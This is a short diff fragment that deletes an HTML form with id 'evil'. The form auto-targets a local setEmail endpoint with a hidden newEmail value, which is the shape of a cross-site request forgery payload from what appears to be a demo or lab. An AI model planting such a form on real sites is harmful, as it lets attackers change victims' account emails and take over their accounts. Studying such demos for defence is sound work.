@@ -1,7 +1,0 @@
--
--                    <form id=evil action="http://local:3002/setEmail" method="POST">
--		    
--		      <input type="hidden" name="newEmail" value="abc@example.com" />
--		    
--                    </form>
--		  
